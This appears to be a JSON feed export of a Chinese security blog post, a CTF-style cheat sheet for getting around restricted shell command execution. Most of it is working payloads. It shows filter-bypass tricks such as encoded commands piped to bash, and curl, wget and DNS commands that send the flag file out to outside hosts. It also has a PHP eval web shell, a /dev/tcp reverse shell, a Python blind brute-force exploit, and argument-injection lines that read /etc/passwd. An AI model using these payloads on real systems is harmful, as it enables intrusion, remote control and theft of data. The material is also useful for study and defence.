{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog • All posts by \"bypass\" category",
    "description": "M1N的博客",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "http://blog.m1n.me/2020/07/09/%E5%AD%98%E5%9C%A8%E9%99%90%E5%88%B6%E7%9A%84shell%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "存在限制的shell命令执行",
            "date_published": "2020-07-09T09:01:12.000Z",
            "content_html": "<h1 id=\"截断符-amp-amp\"><a href=\"#截断符-amp-amp\" class=\"headerlink\" title=\"截断符;,|,||,&amp;&amp;\"></a>截断符<code>;</code>,<code>|</code>,<code>||</code>,<code>&amp;&amp;</code></h1><ol>\n<li><code>|</code>表示管道，上一条命令的输出，作为下一条命令参数(输入)</li>\n<li><code>||</code> 表示上一条命令执行失败后，才执行下一条命令</li>\n<li><code>&amp;&amp;</code>表示前一条命令执行成功时，才执行后一条命令</li>\n<li><code>&amp;</code>表示任务在后台执行,如<code>java -jar test.jar &gt; log.txt &amp;</code>，同时，放在两个命令之间时两个都会执行，第一个命令后台执行</li>\n<li><code>%0a</code>换行符</li>\n<li><code>%0d</code>回车符</li>\n<li><code>;</code></li>\n</ol>\n<h1 id=\"shell存在部分过滤\"><a href=\"#shell存在部分过滤\" class=\"headerlink\" title=\"shell存在部分过滤\"></a>shell存在部分过滤</h1><ol>\n<li><p>过滤了空格</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-variable\">$IFS</span><br><span class=\"hljs-variable\">$&#123;IFS&#125;</span><br><span class=\"hljs-variable\">$IFS</span><span class=\"hljs-variable\">$1</span> <span class=\"hljs-regexp\">//</span><span class=\"hljs-variable\">$1</span>改成$加其他数字貌似都行<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class=\"hljs-regexp\">//</span>用逗号实现了空格功能<br>%<span class=\"hljs-number\">20</span><br>%<span class=\"hljs-number\">09</span><br>kg=$<span class=\"hljs-string\">&#x27;\\x20/flag&#x27;</span>&amp;&amp;cat<span class=\"hljs-variable\">$kg</span> <span class=\"hljs-regexp\">//</span>\\x20变成了空格<br>\\t和\\r和\\n代替空格<br></code></pre></td></tr></table></figure></li>\n<li><p>过滤了部分关键词</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">拼接实现绕过：a=l;b=s;<span class=\"hljs-keyword\">$a$b</span><br><span class=\"hljs-keyword\">引号、反斜杠绕过：ca&#x27;&#x27;t    ca&quot;&quot;t  ca\\t</span><br><span class=\"hljs-keyword\">特殊变量绕过：ca#@t  ca#*t</span><br><span class=\"hljs-keyword\">编码绕过：echo Y2F0IC9mbGFn|base64 -d|bash</span><br><span class=\"hljs-keyword\">\t\techo &quot;636174202f666c6167&quot; | xxd -r -p|bash（hex编码）</span><br><span class=\"hljs-keyword\">\t\t$</span>(printf &quot;<span class=\"hljs-symbol\">\\x</span>63<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>74<span class=\"hljs-symbol\">\\x</span>20<span class=\"hljs-symbol\">\\x</span>2f<span class=\"hljs-symbol\">\\x</span>66<span class=\"hljs-symbol\">\\x</span>6c<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>67&quot;)<br>\t\t&#123;printf,&quot;<span class=\"hljs-symbol\">\\x</span>63<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>74<span class=\"hljs-symbol\">\\x</span>20<span class=\"hljs-symbol\">\\x</span>2f<span class=\"hljs-symbol\">\\x</span>66<span class=\"hljs-symbol\">\\x</span>6c<span class=\"hljs-symbol\">\\x</span>61<span class=\"hljs-symbol\">\\x</span>67&quot;&#125;|bash<br>\t\t当bash也被禁时，可以试试sh<br>通配符绕过：fl*   fla?   fla[0-z]  fla[123hg]  fla&#123;1,2,3,g&#125; <br>\t\t一些常用的通配符：<br>\t\t\t* 匹配任意个数的字符<br>\t\t\t? 匹配一个字符<br>\t\t\t[list] 匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合<br>\t\t\t[^list] 匹配指定范围外的任意单个字符或字符集合<br>\t\t\t[!list] 和[^list]一样<br>\t\t\t&#123;1,2,&#125; 逐一匹配<br></code></pre></td></tr></table></figure></li>\n<li><p>过滤<code>/</code></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs powershell\"><span class=\"hljs-built_in\">cat</span> `expr substr <span class=\"hljs-variable\">$</span>(<span class=\"hljs-built_in\">pwd</span>) <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>`flag<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h1><p>文章：’<a href=\"https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/\">https://250.ac.cn/2018/12/18/%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%88%A9%E7%94%A8/</a>‘</p>\n<h3 id=\"服务器可以访问外网\"><a href=\"#服务器可以访问外网\" class=\"headerlink\" title=\"服务器可以访问外网\"></a>服务器可以访问外网</h3><ol>\n<li><p>curl ：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">curl http:<span class=\"hljs-regexp\">//</span>**.**.**.**<span class=\"hljs-regexp\">/index.php?jingzhe=`cat /</span>flag`<br>curl -d `cat <span class=\"hljs-regexp\">/flag|base64` http:/</span><span class=\"hljs-regexp\">/example.com</span><br></code></pre></td></tr></table></figure></li>\n<li><p>wget:</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">wget http:<span class=\"hljs-regexp\">//</span>**.**.**.**<span class=\"hljs-regexp\">/index.php?jingzhe=`cat /</span>flag`<br></code></pre></td></tr></table></figure></li>\n<li><p>DNSlog:</p>\n<figure class=\"highlight autohotkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autohotkey\">ping `cat /flag`.aaaaaa.ceye.io<br></code></pre></td></tr></table></figure></li>\n<li><p>写shell：</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"xml\">echo &#x27;</span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&quot;flag&quot;</span>]); <span class=\"hljs-meta\">?&gt;</span></span><span class=\"xml\">&#x27; &gt; aaa.php</span><br></code></pre></td></tr></table></figure></li>\n<li><p>反弹shell</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\"><span class=\"hljs-variable\">$ </span>bash -c <span class=\"hljs-string\">&quot;sh &gt;&amp; /dev/tcp/0.0.0.0/80 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"服务器无法访问外网\"><a href=\"#服务器无法访问外网\" class=\"headerlink\" title=\"服务器无法访问外网\"></a>服务器无法访问外网</h3><p>爆破，EXP：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># -*-coding:utf-8 -*-import requestsimport reflag_format = re.compile(&#x27;flag\\\\&#123;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;\\\\&#125;&#x27;)all_letter = &#x27;-&#125;0123456789abcdefghijklmnopqrstuvwxyz&#x27;def get_flag(command):    try:        r = requests.get(&#x27;http://web.train.lilac.com:10008/&#x27;, params=&#123;&#x27;command&#x27;: command&#125;, timeout=1.5)    except:        return True    return Falseif __name__ == &#x27;__main__&#x27;:    flag = &#x27;flag&#123;&#x27;    while flag_format.match(flag) == None:        staus = 0        for i in all_letter:            payload = &#x27;| cat /flag | grep %s &amp;&amp; sleep 1.8&#x27; % (flag + i)            print(payload)            if get_flag(payload):                staus = 1                flag += i                print(flag)                break        if staus == 0:            flag = flag[0:-1]</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参数注入\"><a href=\"#参数注入\" class=\"headerlink\" title=\"参数注入\"></a>参数注入</h1><p><a href=\"https://www.anquanke.com/post/id/107336\">https://www.anquanke.com/post/id/107336</a></p>\n<ol>\n<li><p>tar</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">tar --<span class=\"hljs-keyword\">use</span>-<span class=\"hljs-keyword\">compress</span>-<span class=\"hljs-keyword\">program</span>=&#x27;<span class=\"hljs-keyword\">cat</span> /etc/passwd&#x27; -<span class=\"hljs-keyword\">cf</span> 2.tar *<span class=\"hljs-keyword\">cat</span> 2.tar<br></code></pre></td></tr></table></figure></li>\n<li><p>find</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sqf\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> 命令 \\; -quitfind . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> cat /etc/passwd \\; -quitfind . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> <span class=\"hljs-built_in\">echo</span> hello \\; -quit<br></code></pre></td></tr></table></figure></li>\n<li><p>git</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">git <span class=\"hljs-keyword\">grep</span> -i --<span class=\"hljs-built_in\">line</span>-<span class=\"hljs-keyword\">number</span> -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">&#x27;--open-files-in-pager=命令;&#x27;</span> master<br></code></pre></td></tr></table></figure></li>\n<li><p>wget</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">$url = &#x27;--<span class=\"hljs-built_in\">directory</span>-<span class=\"hljs-built_in\">prefix</span>=/<span class=\"hljs-built_in\">var</span>/www/html http://<span class=\"hljs-built_in\">example</span>.com/<span class=\"hljs-built_in\">example</span>.php&#x27;;<span class=\"hljs-built_in\">system</span>(escapeshellcmd(&#x27;wget &#x27;.$url));<br></code></pre></td></tr></table></figure></li>\n<li><p>sendmail</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">sendmail -t -i -f <span class=\"hljs-keyword\">from</span>@sth.com -C<span class=\"hljs-regexp\">/etc/</span>passwd -X<span class=\"hljs-regexp\">/tmp/</span>output.txt &lt; mail.txt<br></code></pre></td></tr></table></figure></li>\n<li><p>curl</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">curl -F password=@<span class=\"hljs-regexp\">/etc/</span>passwd http:<span class=\"hljs-regexp\">//</span>example.com<br></code></pre></td></tr></table></figure></li>\n<li><p>mysql</p>\n<figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs erlang-repl\">mysql -uuser -ppassword -e  \\! 命令<br></code></pre></td></tr></table></figure></li>\n<li><p>untar</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">$zip_name = <span class=\"hljs-string\">&#x27;-d /var/www/html archive.zip&#x27;</span>;<span class=\"hljs-keyword\">system</span>(<span class=\"hljs-string\">&#x27;unzip -j &#x27;</span>.escapeshellarg($zip_name).<span class=\"hljs-string\">&#x27; *.tmp -d /tmp&#x27;</span>);<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"软连接\"><a href=\"#软连接\" class=\"headerlink\" title=\"软连接\"></a>软连接</h1><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ln</span> -s /etc/passwd <span class=\"hljs-number\">222222</span>.jpgtar cvfp <span class=\"hljs-number\">1</span>.tar <span class=\"hljs-number\">222222</span>.jpg<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"长度限制注入\"><a href=\"#长度限制注入\" class=\"headerlink\" title=\"长度限制注入\"></a>长度限制注入</h1><p><a href=\"https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/\">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a></p>\n<p>例：</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">&gt;ls<span class=\"hljs-symbol\">\\\\</span>ls&gt;_&gt;<span class=\"hljs-symbol\">\\ </span><span class=\"hljs-symbol\">\\\\</span>&gt;-t<span class=\"hljs-symbol\">\\\\</span>&gt;<span class=\"hljs-symbol\">\\&gt;</span>gls&gt;&gt;_<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"grep大法\"><a href=\"#grep大法\" class=\"headerlink\" title=\"grep大法\"></a>grep大法</h1><p><code>grep -ri . flag</code></p>\n",
            "tags": []
        }
    ]
}